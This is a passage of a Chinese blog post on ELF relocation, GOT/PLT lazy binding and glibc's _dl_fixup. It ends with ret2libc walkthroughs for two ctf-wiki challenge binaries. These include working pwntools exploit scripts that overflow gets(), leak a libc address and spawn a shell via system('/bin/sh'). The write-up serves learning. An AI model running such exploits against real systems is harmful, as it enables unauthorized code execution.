+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r test</span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rel.dyn&#x27; at offset 0x39c contains 3 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804bff4  00000206 R_386_GLOB_DAT    00000000   _ITM_deregisterTM[...]</span><br><span class="line">0804bff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804bffc  00000506 R_386_GLOB_DAT    00000000   _ITM_registerTMCl[...]</span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rel.plt&#x27; at offset 0x3b4 contains 2 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804c00c  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34</span><br><span class="line">0804c010  00000307 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p>可以看到在<code>.rel.plt</code>中<code>puts</code>函数的<code>r_offset</code>值为<code>0804c010</code>。这个值指到了哪里？回到前面程序，我们可以看到：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049050</span> &lt;puts@plt&gt;:</span><br><span class="line"> <span class="number">8049050</span>:       ff <span class="number">25</span> <span class="number">10</span> c0 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">jmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">ds</span>:<span class="number">0x804c010</span></span><br><span class="line"> <span class="number">8049056</span>:       <span class="number">68</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x8</span></span><br><span class="line"> 804905b:       e9 d0 ff ff ff          <span class="keyword">jmp</span>    <span class="number">8049030</span> &lt;_init+<span class="number">0x30</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>这个地址就是<code>puts@plt</code>第一条指令跳转的目的地址，也就是在GOT表中<code>puts</code>对应的表项。那么，完成重定位之后，<code>puts</code>函数的地址就会被写入该偏移的地址。如果下次再需要调用这个函数，就可以直接调用这个地址进行跳转了，不需要再去执行各种解析操作。</p>
+<p>这个<code>Elf32_Rel</code>表项在哪里？这个表项在<code>.rel.plt</code>这一节中，我们可以通过<code>Elf32_Dyn</code>表项去找到。</p>
+<p>而<code>puts</code>函数的信息字段是<code>00000307</code>，这个值我们可以去和<code>Elf32_Rel</code>中<code>r_info</code>进行对照。</p>
+<p>对于上面的<code>ELF32_REL</code>和<code>ELF32_RELA</code>，还有下面三个定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(i) ((i)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(i) ((unsigned char)(i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))</span></span><br></pre></td></tr></table></figure>
+<p>使用上面的<code>ELF32_R_SYM</code>宏计算<code>ELF32_R_SYM(r_info)</code>就可以得到对应符号在符号表中的偏移。<code>ELF32_R_TYPE</code>则可以计算出对应的类型。</p>
+<p>对于前面的例子，<code>puts</code>函数的<code>r_info</code>为<code>00000307</code>，右移8位之后得到的值为<code>3</code>。我们再去读取符号表，可以看到偏移为<code>3</code>的地方就是<code>puts</code>函数的符号表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s test</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 7 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (2)</span><br><span class="line">     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (3)</span><br><span class="line">     4: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     6: 0804a004     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br></pre></td></tr></table></figure>
+<p>在符号表中，元素对应的类型是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name; <span class="comment">// 符号名在符号字符串表中的索引</span></span><br><span class="line">    Elf32_Addr st_value; <span class="comment">// 符号值（可能是值或者函数地址）</span></span><br><span class="line">    Elf32_Word st_size; <span class="comment">// 符号的大小（字节数这样的）</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">    Elf32_Half st_shndx;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
+<p>其中<code>st_size</code>段是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)</span><br><span class="line">#define ELF32_ST_TYPE(i) ((i)&amp;0xf)</span><br><span class="line">#define ELF32_ST_INFO(b,t) (((b)&lt;&lt;4)+((t)&amp;0xf))</span><br></pre></td></tr></table></figure>
+<p>对于导入符号，这个字段的值是0x12。</p>
+<blockquote>
+<p>休息一会，放松一下。</p>
+</blockquote>
+<p>好了，有了上面的基础，接下来继续看<code>test</code>程序。程序的运行进入了函数<code>_dl_fixup</code>中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line">	   struct link_map *l, </span><br><span class="line">       ElfW(Word) reloc_arg</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>和栈顶的元素对照一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp 0xffffd528 —▸ 0xffffd590 —▸ 0xf7f6ee3c (_GLOBAL_OFFSET_TABLE_) ◂— 0x224d6c /* &#x27;lM&quot;&#x27; */</span><br><span class="line">01:0004│     0xffffd52c —▸ 0xffffd570 ◂— 0x1</span><br></pre></td></tr></table></figure>
+<p>其中<code>struct link_map *l</code>对应的是栈顶的元素，<code>ElfW(Word) reloc_arg</code>对应的是栈顶的下一个元素也就是1。</p>
+<p>接下来，程序执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure>
+<p>前一条语句从<code>l</code>中获得了符号表的地址，第二条语句得到了字符串表的位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取函数的重定位表地址，注意是DT_JMPREL，也就是在.rel.plt节中。</span></span><br><span class="line"><span class="comment">// reloc_offset是1，记得前面readelf -r test得到的结果？puts在.rel.plt的第二个，也就是偏移是1！</span></span><br><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="comment">// 获取符号表的地址</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line"><span class="comment">// 得到函数的重定位地址，也就是GOT表项的地址</span></span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
+<p>接下来是一些定义和检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lookup_t</span> result;</span><br><span class="line">DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"><span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>
+<p>后面是符号表的查找过程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这一段暂时不用管</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">        (<span class="keyword">const</span> <span class="keyword">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">      version = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这一部分有关线程安全</span></span><br><span class="line">  <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">  <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">    <span class="comment">// 加锁</span></span><br><span class="line">    THREAD_GSCOPE_SET_FLAG();</span><br><span class="line">    flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关键部分——查找符号</span></span><br><span class="line">  result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                               version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 完成查找操作，解除锁</span></span><br><span class="line">  <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">    THREAD_GSCOPE_RESET_FLAG();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 之前拿到的链接库的基址，现在还需要加上函数的偏移</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE(result, SYMBOL_ADDRESS(result, sym, <span class="literal">false</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 已经找到了对应的符号，就不需要去做上面的那些事情</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, <span class="literal">true</span>));</span><br><span class="line">  result = l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>经过上面的步骤，我们能够获得所需要的函数的偏移。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">// 将对应的偏移写进GOT表里</span></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>
+<p>完成这个步骤之后，解析过程完成。通过GDB调试可以看到，执行完函数<code>_dl_fixup</code>之后，<code>EAX</code>的值就是<code>puts</code>的实际地址：</p>
+<p><img src="gdb2.jpg" /></p>
+<p>接下来函数经过了栈的清理和一部分恢复操作，将EAX的值写入栈顶并执行<code>ret</code>，可以看到程序<code>ret</code>之后就会进入<code>puts</code>函数执行。</p>
+<p><img src="gdb3.jpg" /></p>
+<p>在执行完<code>puts</code>函数之后，程序回到<code>main</code>函数继续执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0xf7dc0bfa &lt;puts+266&gt;    ret                                  &lt;0x804919f; main+41&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x804919f  &lt;main+41&gt;     add    esp, 0x10</span><br></pre></td></tr></table></figure>
+<p>接下来程序运行到第二次调用<code>puts</code>函数时，我们使用gdb跟进：</p>
+<p><img src="gdb4.jpg" /></p>
+<p>可以看到程序会直接跳转进入了<code>puts</code>函数中执行，并不需要再进行一次<code>_dl_runtime_resolve</code>的操作。</p>
+<p>实际上，如果程序在运行开始时就直接将动态链接库中的所有函数都进行这样的操作也是可以的，但是会带来巨大的性能损耗，所以会采用这样的折中的方式。在第一次调用函数的时候会进行一次GOT表的绑定，之后就不再需要了，这个操作被称为<strong>延迟绑定(Lazy
+Binding)</strong>。</p>
+<p><img src="lazybinding.jpg" /></p>
+<h1 id="ret2libc">ret2libc</h1>
+<p>以<a
+target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">这道题</a>为例。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pwn checksec ret2libc2</span><br><span class="line">[*] &#x27;/home/syml/Temp/ret2libc2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>可以看到没有开启Canary和PIE，但是开启了NX。通过IDA检查发现程序里面没有<code>/bin/sh</code>这样的字符串。</p>
+<p>使用readelf或者IDA都可以看到其中有<code>system</code>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">重定位节 &#x27;.rel.plt&#x27; at offset 0x3c4 contains 11 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">......</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0</span><br><span class="line">......</span><br><span class="line">0804a01c  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>我们使用IDA反编译可以看到<code>main</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是同样的栈溢出漏洞。采用和上次类似的方法可以看出返回地址相对的偏移为112。</p>
+<p>同时，我们还发现在<code>.bss</code>段存在一个变量<code>buf2</code>：</p>
+<p><img src="buf2.jpg" /></p>
+<p>接下来的问题是如何去构造payload。一个思路是，溢出<code>main</code>函数使得它返回到<code>gets@plt</code>，读取数据<code>/bin/sh</code>放入<code>buf2</code>，接下来返回到<code>system@plt</code>，将<code>buf2</code>的内容作为参数传入。</p>
+<p>通过这个思路我们构造payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">gets_addr = <span class="number">0x8048460</span></span><br><span class="line">system_addr = <span class="number">0x8048490</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">112</span> + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>成功。</p>
+<p>其实这个例子并没有具体的体现出来前面扯了一大段的GOT lazy
+binding还有glibc的特点。<a
+target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">这个例子</a>相对来说更难一些。</p>
+<p>程序的保护措施和前一个一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pwn checksec ret2libc3</span><br><span class="line">[*] &#x27;/home/syml/Temp/ret2libc3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>但是查看这里的重定位表就会发现，没有<code>system</code>函数的重定位信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">重定位节 &#x27;.rel.plt&#x27; at offset 0x3ac contains 10 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0</span><br><span class="line">0804a014  00000307 R_386_JUMP_SLOT   00000000   time@GLIBC_2.0</span><br><span class="line">0804a018  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a01c  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a020  00000607 R_386_JUMP_SLOT   00000000   srand@GLIBC_2.0</span><br><span class="line">0804a024  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a028  00000807 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0</span><br><span class="line">0804a02c  00000907 R_386_JUMP_SLOT   00000000   rand@GLIBC_2.0</span><br><span class="line">0804a030  00000a07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>
+<p>接下来拖进IDA看一下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一个背景知识，glibc中各个函数之间相对偏移是固定的——我们知道了一个函数的偏移也就会知道其他所有函数的偏移。同时glibc中也有字符串<code>/bin/sh</code>，我们也可以去获得这个字符串的偏移。现有的工具包括了<a
+target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">python模块</a>和<a
+target="_blank" rel="noopener" href="https://libc.rip/">在线网站</a>等。</p>
+<p>那么问题就是怎么样去泄漏函数的偏移。另一个问题又在于，因为GOT的延迟绑定特点，我们需要读取一个已经执行过了一次的函数的偏移才行。</p>
+<p>那么，我们选择读取<code>__libc_start_main</code>函数的GOT。payload构造如下（在本机上跑真的会碰到各种奇奇怪怪的问题）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = file.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_got = file.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">start = file.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回到puts函数，输出_libc_start_main的GOT，并跳转到_start重新执行程序。</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;!?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span> + p32(puts) + p32(start) + p32(libc_start_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Leak glibc got addr, return to start&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_start_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_addr)</span><br><span class="line">base = libc_start_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用。</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">112</span> + p32(sys_addr) + <span class="string">b&quot;aaaa&quot;</span> + p32(bin_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="参考资料">参考资料</h1>
+<p>[1] <a
+target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">CTFWiki
+栈溢出-基本ROP</a></p>
+<p>[2] <a
+target="_blank" rel="noopener" href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Executable and
+Linkable Format(ELF) Specification</a></p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/03/28/stackoverflow-learn/" title="关于栈溢出的一些东西（基本的）">
+                    <div class="prevTitle">关于栈溢出的一些东西（基本的）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
